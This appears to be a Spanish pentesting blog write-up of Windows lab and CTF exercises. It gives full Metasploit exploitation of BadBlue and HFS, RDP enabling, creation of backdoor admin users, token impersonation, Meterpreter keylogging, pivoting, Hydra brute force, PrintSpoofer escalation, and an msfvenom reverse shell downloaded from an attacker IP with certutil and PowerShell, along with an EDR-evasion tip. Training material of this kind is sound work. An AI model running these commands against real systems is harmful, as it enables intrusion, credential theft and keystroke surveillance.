---
title: "Pentesting en Windows: De la Explotación a la Post-Explotación"
date: 2026-05-02 12:03:00 -0500
categories: [Pentesting, Windows Security, Post-Exploitation]
tags: [Metasploit, BadBlue, Pivoting, RDP, Privilege Escalation, Hydra, SSH, Meterpreter, msfvenom]
description: "Guía completa de laboratorios: explotación de BadBlue, técnicas de pivoting, persistencia con RDP y escalación de privilegios en Windows."
image:
  path: /assets/img/Primer-Blog/escalacion-privilegios.png
  alt: "Explotación y Post Explotación Labs"
toc: true
---

## Windows: Habilitando Remote Desktop (RDP)
En este laboratorio aprenderemos a habilitar el protocolo de escritorio remoto (RDP) de forma manual y automatizada tras haber comprometido un sistema. Esto es vital para tareas de administración o persistencia que requieren una interfaz gráfica.

### 1. Reconocimiento Inicial
Comenzamos identificando el sistema operativo y los servicios visibles.
```shell
ping -c 2 dominio.local
    # ttl=125 -> Indica un sistema operativo Windows (basado en el TTL estándar de 128)
nmap -p- dominio.local
    # 80/tcp  (HTTP)
    # 135/tcp (RPC)
    # 139/tcp (NetBIOS)
    # 445/tcp (SMB)
```
Realizamos un escaneo profundo sobre los puertos detectados:
```shell
nmap -p80,135,139,445 -sCV --min-rate 5000 dominio.local
```
**Hallazgo:** El puerto 80 corre BadBlue 2.7, un servicio vulnerable que permite la ejecución remota de código (RCE). Notamos que el puerto 3389 (RDP) no aparece en el escaneo inicial.

> **Tip Profesional:** En auditorías reales, evita activar servicios innecesarios. Habilitar RDP aumenta la superficie de ataque y puede ser detectado fácilmente por los equipos de Blue Team (Defensa).
{: .prompt-warning }
### 2. Explotación con Metasploit
Al no encontrar información sensible en SMB (smbclient y enum4linux), procedemos a explotar la vulnerabilidad de BadBlue.
```shell
msfconsole -q
search badblue
    use exploit/windows/http/badblue_passthru
        set LPORT 4545
        set RHOSTS dominio.local
        run
# Una vez obtenida la sesión:
            meterpreter> background
    sessions # Verificamos que la Sesión 1 esté activa
```

### 3. Habilitando RDP (Dos Caminos)
#### **Opción A: Forma Automatizada**
Metasploit cuenta con un módulo de post-explotación que realiza todo el proceso por nosotros.
```shell
use post/windows/manage/enable_rdp
    set session 1
    exploit
```
#### **Opción B: Forma Manual (Vía Registro)**
Si prefieres mayor control, puedes hacerlo modificando el registro y levantando el servicio desde la terminal de Windows.
```shell
sessions 1
meterpreter> shell
# 1. Habilitar conexiones RDP en el registro
C:\Windows\System32\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# 2. Configurar y arrancar el servicio de Terminal Services
C:\Windows\System32\> sc config TermService start=auto
C:\Windows\System32\> sc start TermService
# 3. Validar con un escaneo rápido desde nuestra máquina
nmap -p3389 dominio.local
```
### 4. Gestión de Usuarios y Tokens (Incognito)
Para acceder vía RDP, necesitamos credenciales. Podemos cambiar la contraseña actual o crear un nuevo usuario administrador.
```shell
# Verificamos los privilegios que tenemos
C:\Windows\System32\> whoami
    nt authority\system
# Cambiar contraseña al administrador actual
C:\Windows\System32\> net user administrator Password!123

# Crear un nuevo usuario y agregarlo al grupo de administradores
C:\Windows\System32\> net user administrator2 Password!123 /add
C:\Windows\System32\> net localgroup administrators administrator2 /add
```
#### Suplantación de Identidad con Incognito
Si el usuario ya está logueado, podemos intentar suplantar su token de acceso:
```shell
C:\Windows\System32\> Ctrol + Z
    meterpereter> hashdump
    meterpereter> incognito
    meterpereter> help
    meterpereter> list_tokens
    meterpereter> list_tokens -u #Muestra los usuarios que se encuentran logueados en el equipo
        # Resultado esperado:
        # WIN-OMCNDGHRW\Administrator
        # WIN-OMCNDGHRW\administrator2
        
    meterpereter> help
    meterpereter> impersonate_token WIN-OMCNDGHRW\\administrator2 #Permite suplantar el token de un administrador con \\
        # Successfully impersonated user WIN-OMCNDGHRW\\administrator2
    meterpreter> shell
        C:\Windows\System32\> whoami
            WIN-OMCNDGHRW\administrator2
        C:\Windows\System32\> whoami /priv
            #Ver los privilegios de este equipo.
```
> **Tip de sintaxis:** Al usar impersonate_token, recuerda usar la doble barra invertida (\) para que la consola de Meterpreter escape correctamente el carácter y reconozca el dominio/usuario..
{: .prompt-info }

### 5. Acceso Remoto Gráfico
Finalmente, con el servicio activo y las credenciales en mano, lanzamos la conexión desde nuestro equipo de ataque:
```shell
xfreerdp /u:administrator /p:'Password!123' /v:dominio.local /dynamic-resolution
    #Se abrirá una ventana modo gráfico de Windows
```
### Resumen de Comandos Útiles
* **Hashdump:** Extrae los hashes SAM para crackeo offline (meterpreter> hashdump).
* **Whoami /priv:** Verifica qué privilegios tienes en el sistema (ej. SeDebugPrivilege).
* **lsof -i:PORT:** Útil en entornos Linux para verificar procesos en escucha.
* **/dynamic-resolution:** Ayuda a que la ventana se ajuste automáticamente al tamaño de la pantalla

¡Laboratorio completado! Ahora tienes control total sobre la máquina con acceso visual.


## Windows: Manipulación de Archivos y Keylogging
En este laboratorio exploraremos cómo interactuar con el sistema de archivos de una víctima Windows y cómo capturar las pulsaciones de teclado (Keylogging) utilizando las herramientas post-explotación de Meterpreter.

### 1. Obtención de la Sesión
Utilizamos nuevamente el exploit de BadBlue para ganar acceso inicial al sistema.

```shell
msfconsole -q
search badblue
    use exploit/windows/http/badblue_passthru
    set RHOSTS dominio.local
    run
```
### 2. Interacción con el Sistema de Archivos
Una vez dentro, podemos navegar por los directorios y crear archivos para dejar mensajes o desplegar herramientas adicionales.
```shell
# Entramos a la shell de comandos de Windows
meterpreter> shell
    # Navegamos al escritorio del administrador
    C:\> cd Users\Administrator\Desktop
    # Creamos un archivo de texto de prueba
    C:\Users\Administrator\Desktop> echo "Has sido Hackeado." > hackeado.txt
    # Salimos de la shell de Windows para volver a Meterpreter
    C:\Users\Administrator\Desktop> exit  # O Ctrl+C
```
### 3. Keylogging: Captura de Pulsaciones
Meterpreter incluye un módulo capaz de registrar cada tecla que el usuario presiona. Sin embargo, para que funcione correctamente, debemos estar en el contexto de un proceso que tenga interacción directa con la interfaz de usuario.
```shell
meterpreter> help
meterpreter> keyscan_start  #Inicia el registro de teclas
meterpreter> keyscan_dump   #Vuelca las pulsaciones capturadas en pantalla
meterpreter> keyscan_stop   # Detiene el servicio de captura
```
#### El Problema del Contexto de Proceso
Si al ejecutar keyscan_dump no recibes información, es probable que tu sesión esté asociada a un proceso de sistema (como el del propio exploit) que no interactúa con el teclado. Para solucionar esto, debemos migrar a un proceso de usuario, como explorer.exe.

### 4. Migración de Procesos
La migración nos permite mover nuestra sesión de un proceso a otro para ganar estabilidad y acceso a funciones específicas (como el Keylogger).
```shell
# Listamos los procesos activos
meterpreter> ps
# Buscamos 'explorer.exe' y anotamos su PID (primera columna)
# Ejemplo: explorer.exe tiene el PID 2288

# Forma 1: Migrar usando el PID
meterpreter> migrate 2288

# Forma 2: Migrar usando el nombre del proceso
meterpreter> migrate -N explorer.exe
```
> **Tip de Estabilidad:** Migrar a explorer.exe es la opción más común porque es un proceso persistente que se mantiene activo mientras el usuario tenga su sesión iniciada.
{: .prompt-info }
Una vez migrados, el Keylogger funcionará de forma efectiva:

```shell
meterpreter> keyscan_start #Permite tomar las pulsaciones de teclado
meterpreter> keyscan_dump #Recupera las pulsaciones del usuario
```
### Resumen de comandos de Keylogging

| Comando | Acción |
| :--- | :--- |
| `keyscan_start` | Empieza a grabar las pulsaciones de teclado en el buffer. |
| `keyscan_dump` | Muestra en pantalla las pulsaciones capturadas hasta el momento. |
| `keyscan_stop` | Detiene la grabación y limpia el buffer de memoria. |
| `getpid` | Muestra el ID del proceso (PID) en el que estamos alojados actualmente. |
| `ps` | Lista todos los procesos para buscar objetivos de migración (ej. `explorer.exe`). |
| `migrate <PID>` | Mueve la sesión de Meterpreter a un proceso con interacción de usuario. |

Con este flujo, hemos pasado de una explotación inicial a tener control sobre los archivos del usuario y visibilidad sobre todo lo que escribe en su equipo.

## Pivoting: Exploración y Salto entre Redes
En este laboratorio, el objetivo es comprometer una máquina en una red interna a la que no tenemos acceso directo, utilizando una máquina intermedia ya vulnerada. Nuestros objetivos son dominio1.local (accesible) y dominio2.local (oculto).
```shell
# Verificamos conectividad
ping -c 2 dominio1.local
    # Respuesta exitosa
ping -c 2 dominio2.local
    # Fallido: La red no es alcanzable directamente
```
### 1. Comprometiendo el punto de apoyo (Pivot)
Primero, escaneamos y vulneramos el primer objetivo para usarlo como puente.
```shell
nmap -p- -sV dominio1.local
searchsploit hfs 2.3
searchsploit -m 39161
```
Al no encontrar un exploit manual efectivo, recurrimos a Metasploit para obtener una sesión de Meterpreter.

### 2. Configuración de Autoroute
Una vez que tenemos la sesión en dominio1.local, necesitamos que Metasploit sepa cómo llegar a la subred interna.

```shell
msfconsole -q
search hfs
    use exploit/windows/http/rejetto_hfs_exec
        set LPORT 4545
        set RHOSTS dominio1.local
        run

# Dentro de la sesión de Meterpreter
meterpreter> ipconfig   # Identificamos la interfaz de la red interna
meterpreter> background

# Agregamos la ruta hacia la red interna
    use post/multi/manage/autoroute
        set session 1
        set subnet 10.4.21.178 #Es la ip de dominio2.local
        set netmask 255.255.240.0
        run
```
### 3. Escaneo de Puertos mediante el Túnel (PortScan)
Con la ruta establecida, podemos usar módulos auxiliares de Metasploit para "mirar" a través del pivot.
```shell
use auxiliary/scanner/portscan/tcp
    set RHOSTS 10.4.21.178 # IP de dominio2.local
    run

# Resultados:
10.4.21.178:80/tcp open
10.4.21.178:445/tcp open
```
### 4. Port Forwarding (Redirección de Puertos)
Para usar herramientas externas (como un navegador o un Nmap avanzado), redirigimos los puertos de la víctima a nuestra máquina local.
```shell
# Regresamos a la sesión 1
    session 1
        meterpereter> portfwd add -l 80 -p 80 -r 10.4.21.178
        meterpereter> portfwd add -l 445 -p 445 -r 10.4.21.178
```
Ahora, al atacar nuestro propio localhost, el tráfico se tuneliza hacia la víctima interna:

```shell
nmap -p80,445 -sV --min-rate 3000 127.0.0.1 
```
> **Tip de rendimiento:** Los escaneos de versiones (-sV) a través de un portfwd son significativamente más lentos debido a la latencia del túnel. Ten paciencia.
{: .prompt-info }

### Explotación Final: BadBlue
Para comprometer dominio2.local, aprovecharemos el servicio BadBlue detectado.
```shell
msfconsole -q
    use exploit/windows/http/badblue_passthru
        set RHOSTS dominio2.local
        set PAYLOAD windows/meterpreter/bind_tcp
        set LPORT 8787
        run
```
#### ¿Por qué Bind TCP y no Reverse TCP?
En este escenario de pivoting, un Reverse TCP fallaría porque la víctima interna no sabe cómo "regresar" la conexión a nuestra IP atacante a través del túnel de forma automática.

#### 1. Reverse TCP (Atacante ← Víctima)
* **Flujo:** La víctima inicia la conexión hacia nosotros (LHOST).

* **Problema:** El firewall o la falta de rutas en la red interna bloquean la salida de la víctima hacia nuestra máquina.

* **El concepto:** "No me llames, yo te llamo".

#### 2. Bind TCP (Atacante → Víctima)
* **Flujo:** Nosotros iniciamos la conexión hacia la víctima.

* **Solución:** Al abrir un puerto en la víctima, nosotros simplemente "entramos" a través del túnel que ya establecimos.
Aquí, el payload se comporta como un "servidor" o servicio pasivo. Al ejecutarse, abre un puerto específico (en este ejercicio, el 8787) en la máquina comprometida y permanece a la escucha (listening) de una conexión entrante.

* **El concepto:** "La puerta está abierta, entra cuando quieras".

#### **¿Cuál elegir?**
Como regla general en pentesting:

1. Intenta primero un Reverse Shell: La mayoría de las redes permiten tráfico de salida (HTTP/HTTPS), lo que facilita la conexión de vuelta.
2. Si el Reverse falla, opta por un Bind Shell: Especialmente útil en movimientos laterales dentro de una red interna donde no hay restricciones de puerto entre servidores del mismo segmento.

> **Tip Pro:** El uso de **bind_tcp** en auditorías reales es menos común porque deja un puerto expuesto en el objetivo que cualquier escáner de seguridad podría detectar, reduciendo el sigilo de la operación..
{: .prompt-warning }

## Host & Network Penetration Testing: Post-Explotation CTF 2
En este laboratorio final, pondremos en práctica todas las técnicas de post-explotación aprendidas. El objetivo es comprometer totalmente el sistema en `dominio.local` y extraer las tres flags principales.

### 1. Descubrimiento y Fuerza Bruta: El usuario Alice
Iniciamos con un reconocimiento agresivo para identificar servicios críticos.
```shell
# Escaneo de puertos y servicios
nmap -p- -sVC dominio.local --min-rate=5000
nmap -p22,135,139,445,3389 -sVC -Pn dominio.local --min-rate=5000

# Enumeración de recursos compartidos y usuarios
crackmapexec smb dominio.local
enum4linux dominio.local
smbclient -L dominio.local -N
```
Identificamos que el puerto 22 (SSH) está abierto. Intentaremos un ataque de fuerza bruta contra el usuario alice. Primero, nos aseguramos de que el diccionario rockyou esté descomprimido:
```shell
gzip -d /usr/share/wordlists/rockyout.txt.gz
```
Lanzamos el ataque con Hydra:
```shell
hydra -l alice -P /usr/share/wordlists/rockyou.txt ssh://dominio.local
```
Una vez obtenida la contraseña, nos conectamos por SSH para obtener la Flag 1:
```shell
ssh alice@dominio.local
C:\Users\alice> type flag1.txt
```

### 2. Movimiento Lateral: Cracking de Hashes (David)
En el directorio de Alice encontramos un archivo llamado hashdump.txt. Lo extraemos a nuestra máquina atacante para crackearlo con John the Ripper.
```shell
# En nuestra máquina Kali
nano hashdump.txt # Pegamos el contenido del hash detectado
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashdump.txt

xfreerdp /u:david /p:orange /v:dominio.local #Error
```
**Resultado:** Encontramos las credenciales david:orange. Aunque intentamos entrar por RDP (3389) y falla, podemos usar SSH nuevamente:
```shell
ssh david@dominio.local
C:\Users\david> whoami /priv
# Observamos que SetImpersonatePrivilege está habilitado.
    dir
    net user alice
    whoami /groups
```
Aquí localizamos la Flag 2.

### 3. Escalación de Privilegios a SYSTEM
Tenemos el privilegio SetImpersonatePrivilege, lo cual es una vulnerabilidad crítica. Tenemos dos opciones para escalar:
#### Opción A: PrintSpoofer (Exploit Local)
Buscamos el binario PrintSpoofer64.exe en Kali y lo transferimos mediante SCP:
```shell
# En Kali
cd Desktop/
updatedb -> #Cuando se crea un nuevo archivo en el sistema, se debe hacer esto para que locate pueda encontrar los nuevos archivos.
locate PrintSpoofer64.exe
scp /ruta/al/archivo/PrintSpoofer64.exe david@dominio.local:"C:\\Users\\david\\"

# En la máquina víctima
C:\Users\david> PrintSpoofer64.exe -i -c cmd
C:\Windows\System32> whoami
# Resultado: NT AUTHORITY\SYSTEM
```
SCP funciona solo porque tenemos el ssh con el usuario y contraseña de David, en caso que no tengamos las credenciales, se procede a subir con certutil.
Con el comando nos cambia la shell a system 32 y al hacer el whoami nos duce que ya somos **NT AUTHORITY/SYSTEM**

#### Opción B: Meterpreter Shell (msfvenom)
Generamos un payload malicioso para obtener una shell reversa:

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=10.10.42.2 LPORT=4040 -f exe -o reverse.exe
# Servidor temporal para transferencia
python3 -m http.server 80
```
El comando de msfvenom significa lo siguiente
   * **-p:** Establece la ruta del payload a utilizar
   * **LHOST:** Es la dirección IP de mi máquina
   * **LPORT:** Es el puerto ip por el cual voy a entablar la comunicación
   * **-f:** Es el tipo de archivo que voy a generar
   * **-o:** Es el nombre del archivo

En la víctima descargamos y ejecutamos:
```shell
certutil.exe -f -split -urlcache http://10.10.42.2/reverse.exe reverse.exe
```

Configuramos el multi/handler en Metasploit, ejecutamos reverse.exe en la víctima y obtendremos una sesión con máximos privilegios.

```shell
msfconsole -q
    use exploit/multi/handler
        set LHOST 10.10.42.2
        set LPORT 4040
        set Payload Windows/x64/meterpreter/reverse_tcp
        run
```
En el equipo víctima ahora se ejecuta el payload cargado.
```shell
reverse.exe
```

Al ejecutar el payload, establecemos conexión con la sesión meterpreter y con eso obtenemos **NT AUTHORITY/SYSTEM**
Una vez accedido al equipo con privilegios, simplemente se debe acceder a la ruta system32 para buscar la flag3.txt.

### 4. Acceso a la Flag Restringida (Manipulación de ICACLS)
Incluso como SYSTEM, el acceso a la carpeta del Administrador puede estar explícitamente denegado en algunos CTFs.
#### Gestión de Permisos con ICACLS
Si intentamos entrar a la carpeta y recibimos "Acceso Denegado", verificamos los permisos:
```shell
# Ver permisos actuales
icacls C:\Users\Administrator\flag
#flag NT AUTHORITY\SYSTEM:(OI)(CI)(DENY)(RX)
#         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
#         BUILTIN\Administrators:(I)(OI)(CI)(F)
#         WIN-AQESBVCDAA\Administrators:(I)(OI)(CI)(F)

# Quitar la restricción de denegación (Deny) para SYSTEM
icacls C:\Users\Administrator\flag /remove:d "NT AUTHORITY\SYSTEM"
```

#### Acceso Gráfico Final
Si deseamos ver la flag en modo gráfico, habilitamos RDP manualmente:
```shell
# Crear usuario administrador de respaldo
net user administrador2 Password!123 /add
net localgroup administrators administrador2 /add

# Habilitar RDP en el registro
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
sc config TermService start=auto
sc start TermService

# Conexión final desde Kali
xfreerdp /u:administrator2 /p:Password!123 /v:dominio.local /dynamic-resolution
```
### Tips Pro para Auditorías Reales

> **Tip 1: Housekeeping (Limpieza de Rastros)**
> En un ejercicio de pentesting real o en un examen de certificación (como el OSCP), es vital no dejar "basura" en el sistema. Al finalizar, asegúrate de:
> *   Eliminar los binarios transferidos (`PrintSpoofer64.exe`, `reverse.exe`).
> *   Borrar los usuarios temporales creados (`net user admin_temp /delete`).
> *   Restaurar las configuraciones del registro si habilitaste RDP.
> **Comando:** `del C:\Users\david\reverse.exe`
{: .prompt-warning }

> **Tip 2: PowerShell como alternativa a Certutil**
> Si el sistema objetivo tiene un EDR (Endpoint Detection and Response) agresivo, `certutil.exe` suele estar muy vigilado. Una alternativa más "silenciosa" es usar PowerShell para descargar tus herramientas:
> ```powershell
> powershell -c "Invoke-WebRequest -Uri 'http://10.10.42.2/reverse.exe' -OutFile 'C:\Users\david\reverse.exe'"
> ```
> O su versión corta: `iwr -uri http://10.10.42.2/reverse.exe -o C:\Users\david\reverse.exe`
{: .prompt-info }

## Conclusiones: Serie de Laboratorios de Post-Explotación

Esta serie de laboratorios nos ha permitido recorrer el ciclo completo de una intrusión, desde la vulneración inicial hasta el control total del sistema. A continuación, se resumen los aprendizajes clave que definen el éxito en una auditoría de seguridad profesional.

---

### 1. La Topología Dicta la Herramienta (BadBlue & Pivoting)
El éxito de un exploit no depende solo del código, sino de la arquitectura de red. Comprender la diferencia entre un **Bind** y un **Reverse TCP** es vital:
*   **Adaptabilidad:** Los firewalls de salida (Egress Filtering) pueden bloquear un reverse shell, obligándonos a usar conexiones entrantes (Bind).
*   **Movimiento Lateral:** El uso de **Autoroute** y **Port Forwarding** nos permite "ver" lo invisible, saltando entre subredes para alcanzar objetivos aislados que no tienen salida directa.

### 2. De la Consola al Control Visual (RDP & Post-Ex)
Habilitar servicios como **RDP** de forma remota transforma una sesión limitada de comandos en una estación de administración completa.
*   **Manipulación de Registro:** El ajuste de llaves de registro (`fDenyTSConnections`) es una técnica potente para habilitar accesos persistentes sin herramientas externas.
*   **Suplantación de Identidad:** El uso de **Incognito** demuestra que los tokens de sesión de usuarios logueados son activos tan valiosos como sus propias contraseñas.

### 3. Persistencia y Sigilo (Keylogging & Migración)
La información más sensible suele estar en movimiento y requiere un contexto específico para ser capturada.
*   **Migración de Procesos:** Aprendimos que la estabilidad depende de dónde "vivimos" dentro del sistema. Migrar a `explorer.exe` asegura la persistencia del **Keylogger** aunque la aplicación vulnerable se cierre.
*   **Captura de Datos:** El monitoreo de pulsaciones es una de las técnicas de post-explotación más críticas para obtener credenciales de otros servicios internos y movimientos del usuario.

### 4. La Cadena de Ataque Integrada (CTF Final)
El laboratorio final consolidó la importancia de la escalación de privilegios y la persistencia avanzada.
*   **Vulnerabilidades de Configuración:** Privilegios como `SetImpersonatePrivilege` son puertas abiertas para herramientas de explotación local como **PrintSpoofer**.
*   **Control de Acceso (ACLs):** El uso de `icacls` nos recordó que incluso como `SYSTEM`, a veces debemos reclamar manualmente los permisos sobre archivos restringidos para completar el objetivo.

---

### Resumen Técnico de Herramientas

| Fase | Herramienta Clave | Propósito Principal |
| :--- | :--- | :--- |
| **Pivoting** | `autoroute` / `portfwd` | Salto entre subredes y túneles de puerto. |
| **Acceso** | `enable_rdp` / `reg add` | Habilitación de interfaz gráfica remota. |
| **Sigilo** | `migrate -N` | Estabilidad de sesión en procesos de usuario. |
| **Escalación** | `PrintSpoofer` / `msfvenom` | Obtención de privilegios `NT AUTHORITY\SYSTEM`. |
| **Persistencia** | `icacls` / `net user` | Manipulación de permisos y creación de cuentas de respaldo. |

---

> **Reflexión Final:** Un verdadero *pentester* no es quien lanza el exploit más complejo, sino quien sabe navegar las restricciones de la red y el sistema para mantener el acceso y extraer información crítica de forma estructurada.
{: .prompt-tip }